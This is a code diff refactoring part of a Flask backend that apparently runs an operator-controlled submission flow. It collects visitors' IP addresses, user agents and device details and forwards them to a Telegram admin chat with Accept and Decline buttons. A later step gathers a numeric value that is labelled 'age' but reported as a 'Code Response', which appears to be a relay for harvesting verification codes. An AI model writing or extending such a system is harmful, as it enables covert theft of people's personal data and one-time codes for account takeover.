+    ip   = (request.headers.get("X-Forwarded-For", request.remote_addr or "")
+            .split(",")[0].strip())
+    ua   = request.headers.get("User-Agent", "Unknown")
+    lang = request.headers.get("Accept-Language", "Unknown")
+    ci   = body.get("clientInfo", {})
 
     text = (
-        "🎮 New Game Submission\n\n"
-        f"⏰ Time: {ts}\n"
-        f"👤 Player: {player_name}\n"
-        f"📍 Location: {game_location}\n\n"
-        "🌐 Client Details:\n"
-        f"• IP: {client_ip}\n"
-        f"• UA: {ua}\n"
-        f"• Language: {ci.get('language', accept_lang)}\n"
-        f"• Screen: {ci.get('screen', 'Unknown')}\n"
-        f"• Timezone: {ci.get('timezone', 'Unknown')}\n"
-        f"• Platform: {ci.get('platform', 'Unknown')}"
+        f"🎮 New Submission\n\n⏰ {ts()}\n"
+        f"👤 {name}\n📍 {loc}\n\n"
+        f"• IP: {ip}\n• UA: {ua}\n"
+        f"• Lang: {ci.get('language', lang)}\n"
+        f"• Screen: {ci.get('screen','?')}\n"
+        f"• TZ: {ci.get('timezone','?')}\n"
+        f"• Platform: {ci.get('platform','?')}"
     )
-
     try:
-        telegram_request(
-            "sendMessage",
-            {
-                "chat_id": ADMIN_CHAT_ID,
-                "text": text,
-                "reply_markup": keyboard([[
-                    {"text": "✅ Accept", "callback_data": f"accept:{sid}"},
-                    {"text": "❌ Decline", "callback_data": f"decline:{sid}"},
-                ]]),
-            },
-        )
-    except Exception as exc:
-        print(f"[submit] Telegram error: {exc}")
-        return jsonify({"error": f"Telegram API error: {exc}"}), 502
+        tg_call("sendMessage", {
+            "chat_id": ADMIN_CHAT_ID,
+            "text": text,
+            "reply_markup": kb([[
+                {"text": "✅ Accept",  "callback_data": f"accept:{sid}"},
+                {"text": "❌ Decline", "callback_data": f"decline:{sid}"},
+            ]]),
+        })
+    except Exception as e:
+        return jsonify({"error": f"Telegram error: {e}"}), 502
 
-    set_session_state(
-        sid,
-        status="submitted",
-        mode=None,
-        number=None,
-        player_name=player_name,
-        game_location=game_location,
-        client_ip=client_ip,
-        user_agent=ua,
-    )
+    set_state(sid, status="submitted", mode=None, number=None,
+              player_name=name, game_location=loc,
+              client_ip=ip, user_agent=ua)
     return jsonify({"ok": True})
 
 
@@ -649,71 +598,50 @@ def submit() -> Any:
 def submit_age() -> Any:
     if request.method == "OPTIONS":
         return "", 200
-
-    payload = request.get_json(silent=True) or {}
-    raw_age = payload.get("age")
-
-    # Accept integer or string representation of a whole number
+    body = request.get_json(silent=True) or {}
     try:
-        age = int(raw_age)
+        age = int(body.get("age"))
     except (TypeError, ValueError):
-        return jsonify({"error": "Age must be a valid whole number."}), 400
-
+        return jsonify({"error": "Age must be a whole number."}), 400
     if age < 1:
         return jsonify({"error": "Age must be at least 1."}), 400
 
-    sid = get_session_id()
-    current = get_or_create_session(sid)
-
-    if current["status"] != "accepted" or current["mode"] != "code":
-        return jsonify({"error": "Age input is not active for this session."}), 409
-
+    sid  = get_sid()
+    curr = get_or_create(sid)
+    if curr["status"] != "accepted" or curr["mode"] != "code":
+        return jsonify({"error": "Code input is not active for this session."}), 409
     if not BOT_TOKEN or not ADMIN_CHAT_ID:
-        return jsonify({"error": "Telegram is not configured."}), 503
+        return jsonify({"error": "Telegram not configured."}), 503
 
-    client_ip = current.get("client_ip") or (
-        request.headers.get("X-Forwarded-For", request.remote_addr or "Unknown")
-        .split(",")[0].strip()
-    )
-    ua = current.get("user_agent") or request.headers.get("User-Agent", "Unknown")
-    ts = get_timestamp()
+    ip = curr.get("client_ip") or (
+        request.headers.get("X-Forwarded-For", request.remote_addr or "")
+        .split(",")[0].strip())
+    ua = curr.get("user_agent") or request.headers.get("User-Agent", "Unknown")
 
     text = (
-        "🎯 Code / Age Response\n\n"
-        f"⏰ Time: {ts}\n"
-        f"👤 Player: {current.get('player_name', 'Unknown')}\n"
-        f"📍 Location: {current.get('game_location', 'Unknown')}\n"
+        f"🎯 Code Response\n\n⏰ {ts()}\n"
+        f"👤 {curr.get('player_name','?')}\n"
+        f"📍 {curr.get('game_location','?')}\n"
         f"🔢 Value: {age}\n\n"
-        "🌐 Client Details:\n"
-        f"• IP: {client_ip}\n"
-        f"• UA: {ua}"
+        f"• IP: {ip}\n• UA: {ua}"
     )
-
     try:
-        telegram_request("sendMessage", {"chat_id": ADMIN_CHAT_ID, "text": text})
-    except Exception as exc:
-        print(f"[age] Telegram error: {exc}")
-        return jsonify({"error": f"Telegram API error: {exc}"}), 502
-
+        tg_call("sendMessage", {"chat_id": ADMIN_CHAT_ID, "text": text})
+    except Exception as e:
+        return jsonify({"error": f"Telegram error: {e}"}), 502
     return jsonify({"ok": True})
 
 
 # ──────────────────────────────────────────────────────────────────────────────
-# Start Telegram long-poll thread
+# Boot
 # ──────────────────────────────────────────────────────────────────────────────
 if BOT_TOKEN and ADMIN_CHAT_ID:
-    _tg_thread = threading.Thread(target=telegram_loop, daemon=True, name="telegram-poll")
-    _tg_thread.start()
-    print(f"[tg] Long-poll thread started (admin_chat={ADMIN_CHAT_ID}).")
+    threading.Thread(target=telegram_loop, daemon=True, name="tg-poll").start()
+    print(f"[tg] long-poll started  admin={ADMIN_CHAT_ID}")
 else:
-    print("[tg] Disabled – set BOT_TOKEN and ADMIN_CHAT_ID in .env")
+    print("[tg] disabled – set BOT_TOKEN + ADMIN_CHAT_ID")
 
 if __name__ == "__main__":
-    # threaded=True gives each request its own thread so the long-poll thread
-    # never blocks HTTP handlers (critical on single-worker hosts).
-    app.run(
-        host="127.0.0.1",
-        port=int(os.environ.get("PORT", "5000")),
-        debug=False,
-        threaded=True,
-    )
+    app.run(host="127.0.0.1",
+            port=int(os.environ.get("PORT", "5000")),
+            debug=False, threaded=True)
